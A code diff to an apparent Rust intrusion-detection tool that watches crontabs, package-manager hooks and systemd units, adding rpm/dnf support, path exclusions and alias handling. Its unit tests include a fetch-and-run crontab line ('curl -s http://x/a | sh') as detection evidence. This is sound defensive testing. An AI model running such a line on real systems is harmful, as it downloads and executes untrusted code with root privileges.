@@ -38,6 +38,15 @@ pub struct CronCfg {
     pub files: Vec<String>,
     /// dpkg's database, read to tell package files apart; empty on hosts without dpkg.
     pub dpkg_db: PathBuf,
+    /// rpm, asked instead with `package_manager = "dnf"`; empty: no package lookups.
+    pub rpm: PathBuf,
+    /// The top-level `package_manager` (`Config::share_package_manager`).
+    #[serde(skip)]
+    pub package_manager: crate::config::PackageManager,
+    /// Paths left out of everything above (`*` within one path component, in any
+    /// component), e.g. the units snapd writes at every refresh. Whatever matches is no
+    /// longer watched at all: an intruder who names a file to match hides it.
+    pub exclude: Vec<String>,
     /// No longer used (dpkg itself isn't run anymore); accepted so older configs still load.
     #[serde(skip_serializing)]
     pub dpkg: PathBuf,
@@ -87,8 +96,11 @@ impl Default for CronCfg {
                 "/root/.profile",
                 // PAM decides who logs in; a module or line added there lets anyone in
                 "/etc/pam.d/*",
-                // apt runs `DPkg::Post-Invoke` hooks as root at every package change
+                // apt runs `DPkg::Post-Invoke` hooks as root at every package change, dnf's
+                // actions plugins their `.action` lines (dnf 4, then dnf 5)
                 "/etc/apt/apt.conf.d/*",
+                "/etc/dnf/plugins/post-transaction-actions.d/*",
+                "/etc/dnf/libdnf5-plugins/actions.d/*",
                 // run as root at every login
                 "/etc/update-motd.d/*",
                 // module loading and device rules run commands as root
@@ -105,7 +117,10 @@ impl Default for CronCfg {
             ]
             .map(String::from)
             .to_vec(),
+            exclude: vec![],
             dpkg_db: "/var/lib/dpkg".into(),
+            rpm: "/usr/bin/rpm".into(),
+            package_manager: Default::default(),
             dpkg: PathBuf::new(),
         }
     }
@@ -155,6 +170,13 @@ pub struct CronReport {
     /// Path -> the local user who could change it (see [`changed_by`]); paths only root can
     /// change are left out. Paths gone since the previous scan keep their last value.
     pub owners: BTreeMap<String, u32>,
+    /// Paths a pattern found that name a file already watched under another path (on
+    /// merged-/usr systems `/usr/local/sbin` is `/usr/local/bin`): left out, so one change
+    /// isn't two alerts, and their disappearance from an older baseline isn't a removal.
+    pub aliases: BTreeSet<String>,
+    /// `[cron] exclude`: paths not watched, whose disappearance from an older baseline isn't
+    /// a removal either.
+    pub exclude: Vec<String>,
 }
 
 /// The first user other than root who owns `path` (the link itself, or what it names) or
@@ -555,14 +577,15 @@ impl Scanner {
     }
 
     pub fn scan(&mut self, cfg: &CronCfg) -> CronReport {
-        let mut r = CronReport { scanned: time::now(), ..Default::default() };
+        let mut r = CronReport { scanned: time::now(), exclude: cfg.exclude.clone(), ..Default::default() };
+        let excluded = |p: &str| cfg.exclude.iter().any(|pat| pattern_matches(pat, p));
         // path -> fingerprint of every file seen, for the origin lookup
         let mut files: BTreeMap<String, String> = BTreeMap::new();
         let mut seen = BTreeSet::new();
         for pattern in &cfg.crontabs {
             for path in crate::digest::expand_files(pattern) {
                 let p = path.display().to_string();
-                if transient(path.file_name().and_then(|n| n.to_str()).unwrap_or("")) || !seen.insert(p.clone()) {
+                if transient(path.file_name().and_then(|n| n.to_str()).unwrap_or("")) || excluded(&p) || !seen.insert(p.clone()) {
                     continue;
                 }
                 match (read_small(&path), self.fingerprint(&path)) {
@@ -599,6 +622,9 @@ impl Scanner {
                     continue;
                 }
                 let p = path.display().to_string();
+                if excluded(&p) {
+                    continue;
+                }
                 match self.fingerprint(&path) {
                     Ok(fp) => {
                         r.items.insert(Key::Task(p.clone()), fp.clone());
@@ -615,16 +641,29 @@ impl Scanner {
             }
         }
         r.patterns = cfg.files.clone();
+        // where each watched file really is (its directory with symlinks resolved): the first
+        // pattern's path is kept, which is the one installers announce (/usr/local/bin)
+        let mut real_paths: BTreeSet<PathBuf> = BTreeSet::new();
         for pattern in &cfg.files {
             for path in expand_glob(pattern) {
                 let p = path.display().to_string();
                 let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
                 // (an enabled timer is already a task)
-                if transient(name) || path.is_dir() || r.items.contains_key(&Key::Task(p.clone())) || r.file_patterns.contains_key(&p) {
+                if transient(name)
+                    || path.is_dir()
+                    || excluded(&p)
+                    || r.items.contains_key(&Key::Task(p.clone()))
+                    || r.file_patterns.contains_key(&p)
+                {
                     continue;
                 }
                 if !path.exists() && !path.is_symlink() {
                     continue; // e.g. no /etc/ld.so.preload: fine, and reported if it appears
+                }
+                let real = path.parent().and_then(|d| std::fs::canonicalize(d).ok()).map_or_else(|| path.clone(), |d| d.join(name));
+                if !real_paths.insert(real) {
+                    r.aliases.insert(p);
+                    continue;
                 }
                 match self.fingerprint(&path) {
                     Ok(fp) => {
@@ -644,6 +683,7 @@ impl Scanner {
                 r.file_patterns.insert(p, pattern.clone());
             }
         }
+        r.script_refs.retain(|s, _| !excluded(s));
         for script in r.script_refs.keys() {
             let fp = match self.fingerprint(Path::new(script)) {
                 Ok(fp) => {
@@ -658,8 +698,17 @@ impl Scanner {
 
         let changed: Vec<String> =
             files.iter().filter(|(p, fp)| self.known.get(*p).is_none_or(|(k, _)| k != *fp)).map(|(p, _)| p.clone()).collect();
-        let origins =
-            if changed.is_empty() || cfg.dpkg_db.as_os_str().is_empty() { HashMap::new() } else { dpkg_origins(&cfg.dpkg_db, &changed) };
+        let origins = if changed.is_empty() {
+            HashMap::new()
+        } else {
+            match package_origins(cfg.package_manager, &cfg.dpkg_db, &cfg.rpm, &changed) {
+                Ok(o) => o,
+                Err(e) => {
+                    r.errors.push(format!("the package database: {e}"));
+                    HashMap::new()
+                }
+            }
+        };
         self.known.retain(|p, _| files.contains_key(p));
         self.hashes.retain(|p, _| files.contains_key(p));
         for p in changed {
@@ -677,15 +726,24 @@ impl Scanner {
     }
 }
 
-/// Package ownership and integrity of the given files, read straight from dpkg's database
-/// (`info/*.list`, `info/*.md5sums`, the `Conffiles:` of `status`), line by line. Running
-/// `dpkg-query -S` / `dpkg --verify` instead would load every package's file list and hash
-/// every file of the owning packages, all charged to logguard's memory limit.
-/// Symlinks (enabled timers) are judged by the unit file they point to. Unknown = local.
-pub(crate) fn dpkg_origins(db: &Path, paths: &[String]) -> HashMap<String, Origin> {
-    use std::io::BufRead;
-    // Path as dpkg may know it -> path as watched. On merged-/usr systems dpkg may list a
-    // file under /lib rather than /usr/lib.
+/// Package ownership and integrity of the given files, from dpkg's database or rpm's (an
+/// empty path: none on this host). Unknown = local.
+pub(crate) fn package_origins(
+    manager: crate::config::PackageManager,
+    dpkg_db: &Path,
+    rpm: &Path,
+    paths: &[String],
+) -> Result<HashMap<String, Origin>, String> {
+    match manager {
+        crate::config::PackageManager::Apt if !dpkg_db.as_os_str().is_empty() => Ok(dpkg_origins(dpkg_db, paths)),
+        crate::config::PackageManager::Dnf if !rpm.as_os_str().is_empty() => rpm_origins(rpm, paths),
+        _ => Ok(HashMap::new()),
+    }
+}
+
+/// Paths as a package database may know them -> path as watched: the path itself, the file
+/// a symlink leads to, and on merged-/usr systems `/lib/x` for `/usr/lib/x`.
+fn lookup_names(paths: &[String]) -> HashMap<String, String> {
     let mut lookup: HashMap<String, String> = HashMap::new();
     for p in paths {
         let real = std::fs::canonicalize(p).map(|r| r.display().to_string()).unwrap_or_else(|_| p.clone());
@@ -695,6 +753,50 @@ pub(crate) fn dpkg_origins(db: &Path, paths: &[String]) -> HashMap<String, Origi
         lookup.insert(real, p.clone());
         lookup.entry(p.clone()).or_insert_with(|| p.clone());
     }
+    lookup
+}
+
+/// The same from rpm: the owning packages (`rpm -qf`), then their files' digests (`rpm -q`),
+/// `%config` files included. Only for files that changed, as with dpkg.
+fn rpm_origins(rpm: &Path, paths: &[String]) -> Result<HashMap<String, Origin>, String> {
+    let lookup = lookup_names(paths);
+    let known: Vec<String> = lookup.keys().cloned().collect();
+    let mut owner: HashMap<String, crate::rpm::FileEntry> = HashMap::new();
+    for chunk in known.chunks(200) {
+        let packages = crate::rpm::owners(rpm, chunk)?;
+        for batch in packages.chunks(crate::rpm::BATCH) {
+            for e in crate::rpm::files(rpm, batch)? {
+                if let Some(orig) = lookup.get(&e.path) {
+                    owner.entry(orig.clone()).or_insert(e);
+                }
+            }
+        }
+    }
+    Ok(owner
+        .into_iter()
+        .map(|(p, e)| {
+            let actual = e
+                .algo
+                .filter(|_| !e.digest.is_empty())
+                .map(|a| open_regular(Path::new(&p)).and_then(|mut f| crate::rpm::hex_digest(a, &mut f)));
+            let o = match actual {
+                Some(Ok(have)) if have != e.digest => Origin::ModifiedPackage(e.package),
+                Some(Err(_)) => Origin::ModifiedPackage(e.package),
+                _ => Origin::Package(e.package),
+            };
+            (p, o)
+        })
+        .collect())
+}
+
+/// Package ownership and integrity of the given files, read straight from dpkg's database
+/// (`info/*.list`, `info/*.md5sums`, the `Conffiles:` of `status`), line by line. Running
+/// `dpkg-query -S` / `dpkg --verify` instead would load every package's file list and hash
+/// every file of the owning packages, all charged to logguard's memory limit.
+/// Symlinks (enabled timers) are judged by the unit file they point to. Unknown = local.
+pub(crate) fn dpkg_origins(db: &Path, paths: &[String]) -> HashMap<String, Origin> {
+    use std::io::BufRead;
+    let lookup = lookup_names(paths);
     let lines = |path: &Path| -> Vec<String> {
         std::fs::File::open(path).map(|f| std::io::BufReader::new(f).lines().map_while(Result::ok).collect()).unwrap_or_default()
     };
@@ -836,6 +938,9 @@ pub struct Finding {
     /// The local user (not root) whose own file or process this is about, who could have made
     /// the change: their alerts share an hourly budget (see `Engine::findings`).
     pub owner: Option<u32>,
+    /// Files this is about, new or changed, for the scan of changed files (`filescan`):
+    /// what is there now, not what was removed.
+    pub files: Vec<String>,
 }
 
 fn quote(s: &str) -> String {
@@ -865,6 +970,7 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence: vec![],
             notify: true,
             owner: None,
+            files: vec![],
         });
     }
     let Some(b) = baseline.as_mut() else {
@@ -896,6 +1002,7 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence: vec![],
             notify: true,
             owner: None,
+            files: vec![],
         });
         return out;
     };
@@ -923,11 +1030,11 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
                 learned_files += usize::from(new_pattern);
                 !new_pattern
             }
-            ('-', Key::File(p)) => r.patterns.iter().any(|pat| pattern_matches(pat, p)),
+            ('-', Key::File(p)) => r.patterns.iter().any(|pat| pattern_matches(pat, p)) && !r.aliases.contains(p),
             _ => true,
         });
     }
-    by_path.retain(|_, changes| !changes.is_empty());
+    by_path.retain(|path, changes| !changes.is_empty() && !r.exclude.iter().any(|pat| pattern_matches(pat, path)));
     let new_patterns: Vec<&String> = r.patterns.iter().filter(|p| !b.patterns.contains(*p)).collect();
     if learned_files > 0 && !b.patterns.is_empty() {
         out.push(Finding {
@@ -942,6 +1049,7 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence: vec![],
             notify: false,
             owner: None,
+            files: vec![],
         });
     } else if learned_files > 0 {
         out.push(Finding {
@@ -955,12 +1063,16 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence: vec![],
             notify: true,
             owner: None,
+            files: vec![],
         });
     }
     b.patterns = r.patterns.iter().cloned().collect();
     let learning = now < b.learning_until;
     b.items = r.items.iter().map(|(k, v)| (k.clone(), v.clone())).collect();
 
+    // scripts that came with a new crontab line: that line's finding reports them; by the
+    // user who could have written the line (or the script)
+    let mut new_scripts: BTreeMap<Option<u32>, Vec<String>> = BTreeMap::new();
     for (path, changes) in by_path {
         let origin = r.origins.get(&path);
         let from = origin.map(|o| format!(" ({})", o.describe())).unwrap_or_default();
@@ -970,6 +1082,17 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
         let removed = lines.iter().filter(|(c, _)| *c == '-').count();
         let file_change = changes.iter().find(|(_, k)| !matches!(k, Key::Line(..)));
         let refs = r.script_refs.get(&path).map(|c| format!(" run from {c}")).unwrap_or_default();
+        // An installer announced this very content (logguard's own binaries and units at
+        // every deploy): logged, not news.
+        let announced = match file_change {
+            Some(('+' | '~', k @ (Key::File(_) | Key::Task(_) | Key::Script(_)))) => {
+                r.items.get(k).is_some_and(|fp| r.expected.get(&path) == Some(fp))
+            }
+            _ => false,
+        };
+        // what is there now, new or changed: for the scan of changed files
+        let present = |k: &Key| r.items.get(k).is_some_and(|v| v != "missing");
+        let files = if !announced && changes.iter().any(|(c, k)| *c != '-' && present(k)) { vec![path.clone()] } else { vec![] };
         let message = match file_change {
             Some(('+', Key::Crontab(_))) => format!("new crontab {path}{from} with {}", plural(added, "task line")),
             Some(('-', Key::Crontab(_))) => format!("crontab {path} was removed ({} gone)", plural(removed, "task line")),
@@ -977,7 +1100,11 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             Some(('~', Key::Task(_))) => format!("scheduled task {path} changed{from}"),
             Some(('-', Key::Task(_))) => format!("scheduled task {path} was removed"),
             // A script appears or disappears with the crontab line that runs it: reported there.
-            Some(('+' | '-', Key::Script(_))) => continue,
+            Some(('+' | '-', Key::Script(_))) => {
+                let by = r.script_refs.get(&path).and_then(|crontab| r.owners.get(crontab)).or_else(|| r.owners.get(&path));
+                new_scripts.entry(by.copied()).or_default().extend(files);
+                continue;
+            }
             Some(('+', Key::File(_))) => format!("new file {path}{from}"),
             Some(('~', Key::File(_))) => format!("{path} changed{from}"),
             Some(('-', Key::File(_))) => format!("{path} was removed"),
@@ -997,14 +1124,6 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
         };
         let mut evidence: Vec<String> = lines.iter().filter(|(c, _)| *c == '+').map(|(_, l)| format!("+ {}", quote(l))).collect();
         evidence.extend(lines.iter().filter(|(c, _)| *c == '-').map(|(_, l)| format!("- {}", quote(l))));
-        // An installer announced this very content (logguard's own binaries and units at
-        // every deploy): logged, not news.
-        let announced = match file_change {
-            Some(('+' | '~', k @ (Key::File(_) | Key::Task(_) | Key::Script(_)))) => {
-                r.items.get(k).is_some_and(|fp| r.expected.get(&path) == Some(fp))
-            }
-            _ => false,
-        };
         if learning || announced {
             let why = if learning { "cron watch (learning, accepted)" } else { "integrity (announced by an installer, accepted)" };
             out.push(Finding {
@@ -1015,6 +1134,7 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
                 evidence,
                 notify: false,
                 owner: None,
+                files,
             });
             continue;
         }
@@ -1034,6 +1154,19 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence,
             notify: true,
             owner: r.owners.get(&path).copied(),
+            files,
+        });
+    }
+    for (owner, scripts) in new_scripts.into_iter().filter(|(_, s)| !s.is_empty()) {
+        out.push(Finding {
+            key: format!("cron-scripts:{}:{now}", owner.map_or("root".to_string(), |u| u.to_string())),
+            every: 0,
+            severity: Severity::Info,
+            message: format!("cron: new {} run by new crontab lines: {}", plural(scripts.len(), "script"), scripts.join(", ")),
+            evidence: vec![],
+            notify: false,
+            owner,
+            files: scripts,
         });
     }
     if !learning && !b.armed {
@@ -1054,6 +1187,7 @@ pub fn judge(baseline: &mut Option<Baseline>, r: &CronReport, learn: Dur) -> Vec
             evidence: vec![],
             notify: true,
             owner: None,
+            files: vec![],
         });
     }
     out
@@ -1121,6 +1255,7 @@ mod tests {
         more.push((line("@reboot /tmp/x"), ""));
         let f = judge(&mut b, &report(2 * h, &more), Dur(86_400));
         assert!(f.len() == 1 && !f[0].notify && f[0].message.contains("learning"), "{f:?}");
+        assert_eq!(f[0].files, [root], "scanned while learning too");
 
         // learn period over: the end is announced once, unchanged scans say nothing
         let f = judge(&mut b, &report(26 * h, &more), Dur(86_400));
@@ -1142,6 +1277,7 @@ mod tests {
         assert_eq!(cron.severity, Severity::High);
         assert!(cron.message.contains("1 task line added") && cron.message.contains("compromised"), "{}", cron.message);
         assert_eq!(cron.evidence, ["+ `* * * * * curl -s http://x/a | sh`"]);
+        assert_eq!((task.files.as_slice(), cron.files.as_slice()), (&["/etc/cron.daily/dpkg".to_string()][..], &[root.to_string()][..]));
         assert!(judge(&mut b, &report(29 * h, &evil), Dur(86_400)).is_empty(), "reported once");
 
         // removing the AV scan line: a warning, not "compromised"
@@ -1150,6 +1286,49 @@ mod tests {
         assert_eq!(f.len(), 1);
         assert_eq!(f[0].severity, Severity::Warning);
         assert!(f[0].message.contains("1 task line removed"));
+        assert!(f[0].files.is_empty(), "nothing new to scan");
+    }
+
+    /// A script that comes with a new crontab line is reported with the line, and scanned too.
+    #[test]
+    fn new_scripts_are_scanned() {
+        let h = 3600 * time::SEC;
+        let root = "/var/spool/cron/crontabs/root";
+        let base = [(Key::Crontab(root.into()), "")];
+        let mut b = None;
+        judge(&mut b, &report(h, &base), Dur(0));
+        let more = [
+            (Key::Crontab(root.into()), ""),
+            (Key::Line(root.into(), "* * * * * /opt/x/run.sh".into()), ""),
+            (Key::Script("/opt/x/run.sh".into()), "aa"),
+        ];
+        let f = judge(&mut b, &report(2 * h, &more), Dur(0));
+        let scripts = f.iter().find(|x| x.key.starts_with("cron-scripts:")).unwrap();
+        assert_eq!(
+            (scripts.severity, scripts.notify, scripts.files.as_slice()),
+            (Severity::Info, false, &["/opt/x/run.sh".to_string()][..])
+        );
+        assert!(f.iter().any(|x| x.notify && x.files == [root]), "{f:?}");
+        assert_eq!(scripts.owner, None, "root's crontab");
+
+        // a user's crontab: the scripts its new lines run are that user's (their scan budget)
+        let eve = "/var/spool/cron/crontabs/eve";
+        let mut r = report(3 * h, &[(Key::Crontab(eve.into()), "")]);
+        r.owners.insert(eve.into(), 1000);
+        judge(&mut b, &r, Dur(0));
+        let mut r = report(
+            4 * h,
+            &[
+                (Key::Crontab(eve.into()), ""),
+                (Key::Line(eve.into(), "* * * * * /usr/bin/a".into()), ""),
+                (Key::Script("/usr/bin/a".into()), "bb"),
+            ],
+        );
+        r.owners.insert(eve.into(), 1000);
+        r.script_refs.insert("/usr/bin/a".into(), eve.into());
+        let f = judge(&mut b, &r, Dur(0));
+        let scripts = f.iter().find(|x| x.key.starts_with("cron-scripts:")).unwrap();
+        assert_eq!((scripts.owner, scripts.files.as_slice()), (Some(1000), &["/usr/bin/a".to_string()][..]));
     }
 
     #[test]
@@ -1169,9 +1348,11 @@ mod tests {
         let f = judge(&mut b, &rep(2 * h, "bb", &[(bin, "bb")]), Dur(0));
         assert!(f.len() == 1 && !f[0].notify && f[0].severity == Severity::Info, "{f:?}");
         assert!(f[0].message.contains("announced by an installer") && f[0].message.contains(bin), "{}", f[0].message);
+        assert!(f[0].files.is_empty(), "logguard's own: not scanned");
         // other content than announced: the usual alert
         let f = judge(&mut b, &rep(3 * h, "cc", &[(bin, "bb")]), Dur(0));
         assert!(f.len() == 1 && f[0].notify && f[0].severity == Severity::High, "{f:?}");
+        assert_eq!(f[0].files, [bin]);
     }
 
     #[test]
@@ -1241,6 +1422,38 @@ mod tests {
         assert!(f.len() == 1 && f[0].severity == Severity::Warning && f[0].message.contains("was removed"), "{f:?}");
     }
 
+    /// Fedora 42 and later merged `sbin` into `bin`: `/usr/local/sbin` is a symlink to
+    /// `/usr/local/bin`, and both patterns find logguard's binary.
+    #[test]
+    fn a_file_found_under_two_names_is_watched_once() {
+        let dir = std::env::temp_dir().join(format!("logguard-aliases-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join("bin")).unwrap();
+        std::os::unix::fs::symlink("bin", dir.join("sbin")).unwrap();
+        std::fs::write(dir.join("bin/tool"), "v1").unwrap();
+        let (bin, sbin) = (format!("{}/bin/*", dir.display()), format!("{}/sbin/*", dir.display()));
+        let cfg = CronCfg { crontabs: vec![], dirs: vec![], dpkg_db: PathBuf::new(), files: vec![bin, sbin], ..Default::default() };
+        let r = Scanner::default().scan(&cfg);
+        let files: Vec<&str> = r.items.keys().filter(|k| matches!(k, Key::File(_))).map(Key::path).collect();
+        assert_eq!(files, [format!("{}/bin/tool", dir.display())], "the first pattern's name");
+        assert!(r.aliases.contains(&format!("{}/sbin/tool", dir.display())));
+
+        // a baseline from before, with both names: the alias goes without a "removed" alert
+        let h = 3600 * time::SEC;
+        let mut both = r.items.clone();
+        both.insert(Key::File(format!("{}/sbin/tool", dir.display())), "x".into());
+        let mut b = Some(Baseline {
+            learning_until: 0,
+            armed: true,
+            items: both.into_iter().collect(),
+            patterns: r.patterns.iter().cloned().collect(),
+        });
+        let mut later = r.clone();
+        later.scanned = 30 * h;
+        assert!(judge(&mut b, &later, Dur(86_400)).is_empty());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
     #[test]
     fn globs_in_any_component() {
         let dir = std::env::temp_dir().join(format!("logguard-glob-{}", std::process::id()));
@@ -1285,6 +1498,50 @@ mod tests {
         assert_eq!(o.get(&path("script")), Some(&Origin::ModifiedPackage("cron".into())));
         assert_eq!(o.get(&path("mine")), None, "unknown = local");
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// `[cron] exclude`: snapd's units and timers aren't watched, and leaving them out later
+    /// isn't their removal.
+    #[test]
+    fn excluded_paths_are_not_watched() {
+        let dir = std::env::temp_dir().join(format!("logguard-cron-ex-{}", std::process::id()));
+        let (units, timers) = (dir.join("system"), dir.join("timers.target.wants"));
+        std::fs::create_dir_all(&units).unwrap();
+        std::fs::create_dir_all(&timers).unwrap();
+        for f in ["mine.service", "snap-firefox-5000.mount", "snap.firefox.hook.service"] {
+            std::fs::write(units.join(f), "[Unit]\n").unwrap();
+        }
+        for f in ["mine.timer", "snap.certbot.renew.timer"] {
+            std::fs::write(timers.join(f), "[Timer]\n").unwrap();
+        }
+        let cfg = |exclude: Vec<String>| CronCfg {
+            crontabs: vec![],
+            dirs: vec![timers.clone()],
+            files: vec![format!("{}/*", units.display())],
+            exclude,
+            dpkg_db: PathBuf::new(),
+            ..Default::default()
+        };
+        let snap =
+            vec![format!("{}/snap-*", units.display()), format!("{}/snap.*", units.display()), format!("{}/snap.*", timers.display())];
+        let mut s = Scanner::default();
+        let all = s.scan(&cfg(vec![]));
+        assert_eq!(all.items.len(), 5);
+        let r = s.scan(&cfg(snap.clone()));
+        let mut paths: Vec<String> = r.items.keys().map(|k| k.path().rsplit('/').next().unwrap().to_string()).collect();
+        paths.sort();
+        assert_eq!(paths, ["mine.service", "mine.timer"], "{paths:?}");
+        // a baseline from before the exclude: the excluded ones aren't reported removed
+        let mut b = None;
+        judge(&mut b, &all, Dur(0));
+        assert!(judge(&mut b, &r, Dur(0)).is_empty());
+        // a new snap unit says nothing; a new unit of another name does
+        std::fs::write(units.join("snap-firefox-5001.mount"), "[Unit]\n").unwrap();
+        std::fs::write(units.join("evil.service"), "[Unit]\n").unwrap();
+        let f = judge(&mut b, &s.scan(&cfg(snap)), Dur(0));
+        assert_eq!(f.len(), 1, "{f:?}");
+        assert!(f[0].message.contains("evil.service") && f[0].severity == Severity::High, "{f:?}");
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 
     #[test]
@@ -1393,6 +1650,36 @@ mod tests {
         let after = fingerprint(&path).unwrap();
         let owner = std::fs::metadata(&path).unwrap().uid();
         assert_eq!(before == after, owner != 0, "owner uid {owner}");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn package_origins_from_rpm() {
+        let dir = std::env::temp_dir().join(format!("logguard-rpm-origins-{}", std::process::id()));
+        let files = dir.join("files");
+        std::fs::create_dir_all(&files).unwrap();
+        let path = |n: &str| files.join(n).display().to_string();
+        let sha = |t: &str| crate::rpm::hex_digest(crate::rpm::Algo::Sha256, &mut t.as_bytes()).unwrap();
+        std::fs::write(path("conf"), "packaged\n").unwrap(); // a %config file, unmodified
+        std::fs::write(path("script"), "edited\n").unwrap(); // a packaged file, modified
+        std::fs::write(path("mine"), "x\n").unwrap(); // nobody's
+        let listed = format!(
+            "cronie\t8\tc\t{}\t{}\ncronie\t8\t\t{}\t{}\ncronie\t8\t\t{}\t/usr/sbin/crond\n",
+            sha("packaged\n"),
+            path("conf"),
+            sha("original\n"),
+            path("script"),
+            sha("crond")
+        );
+        let rpm = crate::rpm::tests::fake_rpm(&dir.join("bin"), "", "cronie\nfile /x is not owned by any package\n", &listed);
+        let o = package_origins(crate::config::PackageManager::Dnf, Path::new(""), &rpm, &[path("conf"), path("script"), path("mine")])
+            .unwrap();
+        assert_eq!(o.get(&path("conf")), Some(&Origin::Package("cronie".into())));
+        assert_eq!(o.get(&path("script")), Some(&Origin::ModifiedPackage("cronie".into())));
+        assert_eq!(o.get(&path("mine")), None, "unknown = local");
+        assert!(package_origins(crate::config::PackageManager::Dnf, Path::new(""), Path::new(""), &[path("conf")]).unwrap().is_empty());
+        let missing = package_origins(crate::config::PackageManager::Dnf, Path::new(""), Path::new("/nonexistent/rpm"), &[path("conf")]);
+        assert!(missing.is_err());
         let _ = std::fs::remove_dir_all(&dir);
     }
 }
